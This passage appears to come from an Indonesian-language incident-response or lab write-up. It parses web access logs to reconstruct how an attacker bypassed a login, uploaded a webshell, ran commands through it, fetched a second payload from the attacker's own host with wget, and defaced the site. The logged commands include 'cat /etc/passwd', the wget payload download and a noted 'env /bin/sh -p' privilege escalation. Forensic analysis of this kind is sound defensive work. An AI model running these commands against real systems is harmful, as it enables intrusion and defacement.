10.233.6.71 - - [16/Sep/2026:13:02:03 +0000] "GET /uploads/halodunia.php?cmd=ls%20-la HTTP/1.1" 200 415 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:13:02:40 +0000] "GET /uploads/halodunia.php?cmd=cat%20shinobijakarta.zip HTTP/1.1" 200 2547 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:13:03:05 +0000] "GET /uploads/halodunia.php?cmd=mv%20shinobijakarta.zip%20shinobijakarta.php HTTP/1.1" 200 195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:13:03:44 +0000] "GET /uploads/halodunia.php?cmd=ls%20-la HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:13:03:45 +0000] "GET /uploads/halodunia.php?cmd=ls%20-la HTTP/1.1" 200 416 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:13:04:04 +0000] "GET /uploads/shinobijakarta.php HTTP/1.1" 200 391 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:13:27:23 +0000] "GET / HTTP/1.1" 200 703 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
10.233.6.71 - - [16/Sep/2026:13:27:23 +0000] "GET /hacked.gif HTTP/1.1" 200 3913961 "http://10.233.6.67:8080/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0"
```
→ Attacker mengunduh payload kedua (`shinobijakarta.zip`) dari server miliknya sendiri (`10.233.6.71`), mengganti ekstensi menjadi `.php`, mengaksesnya (13:04:04), lalu **website berhasil di-deface pukul 13:27:23** (homepage berubah jadi 703 byte + `hacked.gif` termuat).

### Ekstrak seluruh command yang dijalankan lewat webshell
```bash
grep 'halodunia.php?cmd=' attacker_sorted.log | \
  sed -E 's/^.*cmd=([^ ]*) HTTP.*$/\1/' | uniq -c
grep -c 'halodunia.php?cmd=' attacker_sorted.log
```
**Output:**
```
      1 id
      1 whoami
      1 pwd
      1 cat%20/etc/passwd
      1 la%20-la
      2 ls%20-la
      3 wget%20http://10.233.6.71/shinobijakarta.zip
      1 ls%20-la
      1 cat%20shinobijakarta.zip
      1 mv%20shinobijakarta.zip%20shinobijakarta.php
      2 ls%20-la

15
```
→ Total 15 command dijalankan lewat webshell `halodunia.php`, tidak ada command privilege escalation (`env /bin/sh -p`) atau `useradd`/edit `/etc/passwd` di log HTTP ini — itu berarti aktivitas tersebut dilakukan lewat shell interaktif lain (di luar log web).

---

## 7. Kesimpulan Timeline (hasil akhir dari seluruh command di atas)

| Waktu (UTC) | Kejadian |
|---|---|
| 12:08:07 | Recon awal (browsing manual, Firefox UA) |
| 12:08:38 – 12:12:58 | Directory brute force otomatis (15.427 request, Chrome/87 UA) |
| 12:31:27 | Percobaan login manual pertama |
| 12:35:02 – 12:36:19 | Fuzzing SQL Injection pada `POST /administrator` (85 request) |
| **12:36:17** | **Login bypass berhasil** (302) |
| 12:36:59 | Login dikonfirmasi ulang (302) |
| 12:45:55 – 12:46:38 | Upload webshell `halodunia.php` lewat `POST /profile` |
| **12:46:55** | **Command execution pertama berhasil** (`?cmd=id`) |
| 12:47:01 – 13:03:45 | Enumerasi sistem + staging payload kedua (`shinobijakarta.zip` → `.php`) |
| 13:04:04 | Akses pertama ke shell kedua `shinobijakarta.php` |
| **13:27:23** | **Website berhasil di-deface** (`hacked.gif` + homepage berubah) |

**Catatan**: aktivitas privilege escalation (`env /bin/sh -p`) dan penambahan user root di `/etc/passwd` **tidak tercatat di log HTTP ini** karena dilakukan lewat shell interaktif di level OS, bukan lewat request web — sesuai catatan di PDF bahwa analisis lebih lanjut untuk Post-Exploitation Activity perlu sumber log lain (mis. `auth.log`, bash history).
